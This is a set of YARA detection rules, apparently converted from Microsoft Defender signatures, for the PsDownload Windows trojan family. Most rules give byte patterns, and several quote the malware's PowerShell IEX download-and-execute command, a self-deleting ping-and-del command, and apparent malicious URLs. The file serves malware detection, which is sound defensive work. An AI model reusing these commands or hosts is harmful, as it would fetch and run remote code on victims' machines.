rule Trojan_Win32_PsDownload_GBC_2147836716_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GBC!MTB"
        threat_id = "2147836716"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {33 c1 66 89 44 24 ?? 33 c0 66 89 ?? 24 44 33 db 66 31 4c 44 ?? 40 83 f8 ?? 73 07 66 8b 4c 24 ?? eb}  //weight: 10, accuracy: Low
        $x_1_2 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GBX_2147837663_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GBX!MTB"
        threat_id = "2147837663"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {33 c1 66 89 85 c2 fb ff ff 33 c0 5f 66 89 85 c4 fb ff ff 5e 0f 1f 44 00 00 66 31 8c 45 32 fb ff ff 40 83 f8 49 73 09 66 8b 8d 30 fb ff ff eb}  //weight: 10, accuracy: High
        $x_1_2 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GDR_2147839423_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GDR!MTB"
        threat_id = "2147839423"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {33 c1 66 89 85 ?? ?? ?? ?? 33 c0 66 89 85 ?? ?? ?? ?? 33 db 66 31 8c 45 ?? ?? ?? ?? 40 83 f8 ?? 73 09 66 8b 8d ?? ?? ?? ?? eb e9}  //weight: 10, accuracy: Low
        $x_10_2 = {33 c1 66 89 84 24 ?? ?? ?? ?? 33 c0 6a 6f 66 89 84 24 ?? ?? ?? ?? 5a 66 31 4c 44 ?? 40 3b c2 73 ?? 66 8b 4c 24 ?? eb}  //weight: 10, accuracy: Low
        $x_1_3 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_4 = "/c \"powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')\"" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_PsDownload_RD_2147839428_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.RD!MTB"
        threat_id = "2147839428"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {55 89 e5 81 ec 00 00 00 00 90 b8 00 00 00 00 50 b8 00 00 00 00 50 b8 10 20 40 00 50 b8 05 20 40 00 50 b8 00 20 40 00 50 b8 00 00 00 00 50 e8 3d 02 00 00 b8 00 00 00 00 c9 c3}  //weight: 5, accuracy: High
        $x_1_2 = {c1 e0 02 b9 00 ?? 40 00 01 c1 b8 00 ?? 40 00 39 c1 0f 84 1d 00 00 00 8b 45 fc 48 89 45 fc c1 e0 02 b9 00 ?? 40 00 01 c1 8b 01}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GDS_2147839462_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GDS!MTB"
        threat_id = "2147839462"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {33 c0 66 89 85 ?? ?? ?? ?? 5e 66 0f 1f 84 00 00 00 00 00 8b 8d ?? ?? ?? ?? 03 c8 66 31 8c 45 ?? ?? ?? ?? 40 83 f8 0f 72}  //weight: 10, accuracy: Low
        $x_10_2 = {33 c1 66 89 85 ?? ?? ?? ?? 33 c0 66 89 85 ?? ?? ?? ?? 0f 1f 80 00 00 00 00 66 31 8c 45 ?? ?? ?? ?? 40 83 f8 ?? 73 ?? 66 8b 8d ?? ?? ?? ?? eb}  //weight: 10, accuracy: Low
        $x_1_3 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_PsDownload_GDT_2147839578_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GDT!MTB"
        threat_id = "2147839578"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {8b 85 30 fb ff ff 03 c1 66 31 84 4d 32 fb ff ff 41 83 f9 49 72}  //weight: 10, accuracy: High
        $x_1_2 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_3 = "/c \"powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')\"" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GDU_2147839636_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GDU!MTB"
        threat_id = "2147839636"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {33 c1 66 89 85 ?? ?? ?? ?? 33 c0 66 89 85 ?? ?? ?? ?? 66 31 8c 45 ?? ?? ?? ?? 40 83 f8 ?? 73 ?? 66 8b 8d ?? ?? ?? ?? eb}  //weight: 10, accuracy: Low
        $x_1_2 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_MB_2147839833_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.MB!MTB"
        threat_id = "2147839833"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {83 e1 07 c1 e1 03 0f ad ef d3 ed f6 c1 20 74 ?? 89 ef 66 31 3c 46 83 c0 01 89 c1 83 d2 00 83 f1 27 09 d1 75}  //weight: 5, accuracy: Low
        $x_1_2 = ".tls" ascii //weight: 1
        $x_1_3 = "WaitForSingleObject" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GDV_2147839841_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GDV!MTB"
        threat_id = "2147839841"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "www.conectiva.pe/doc" ascii //weight: 1
        $x_1_2 = "consultancyprovider.com/shadi" ascii //weight: 1
        $x_1_3 = "uykluyk65u56" ascii //weight: 1
        $x_1_4 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_5 = "/c ping 127.0.0.1 && del" wide //weight: 1
        $x_1_6 = "/c \"powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')\"" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win32_PsDownload_GCW_2147839903_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GCW!MTB"
        threat_id = "2147839903"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {03 14 81 52 e8 ?? ?? ?? ?? 59 35 ?? ?? ?? ?? 89 45 d8 8b 45 d8 3b 45 08 75 ?? 8b 45 f4 8b 4d e0 0f b7 04 41 8b 4d dc 8b 55 fc 03 14 81 8b c2}  //weight: 10, accuracy: Low
        $x_1_2 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_3 = "/c \"powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')\"" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GCZ_2147839985_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GCZ!MTB"
        threat_id = "2147839985"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {33 c0 66 89 85 ?? ?? ?? ?? 66 0f 1f 44 00 ?? 8b 8d ?? ?? ?? ?? 03 c8 66 31 8c 45 ?? ?? ?? ?? 40 83 f8 ?? 72}  //weight: 10, accuracy: Low
        $x_1_2 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GEW_2147842964_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GEW!MTB"
        threat_id = "2147842964"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {03 14 81 52 e8 ?? ?? ?? ?? 59 35 ?? ?? ?? ?? 89 45 f8 8b 45 ec 8b 4d d8 0f b7 04 41 8b 4d d4 8b 75 f4 03 34 81 8d 45 f8 50}  //weight: 10, accuracy: Low
        $x_1_2 = "uykluyk65u56" ascii //weight: 1
        $x_1_3 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_4 = "/c \"powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')\"" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GHA_2147843676_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GHA!MTB"
        threat_id = "2147843676"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {03 14 81 52 e8 ?? ?? ?? ?? 83 c4 ?? 35 ?? ?? ?? ?? 89 45 d8 8b 45 d8 3b 45 08 75 17 8b 4d f4 8b 55 e0 0f b7 04 4a 8b 4d dc 8b 55 fc 03 14 81 8b c2 eb}  //weight: 10, accuracy: Low
        $x_1_2 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_3 = "/c \"powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')\"" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_PsDownload_GJJ_2147847855_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/PsDownload.GJJ!MTB"
        threat_id = "2147847855"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "PsDownload"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {33 c1 66 89 85 ?? ?? ?? ?? 33 c0 53 66 89 85 ?? ?? ?? ?? 5b 66 90 66 31 8c 45 ?? ?? ?? ?? 40 83 f8 19 73 09 66 8b 8d}  //weight: 10, accuracy: Low
        $x_1_2 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 [0-32] 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

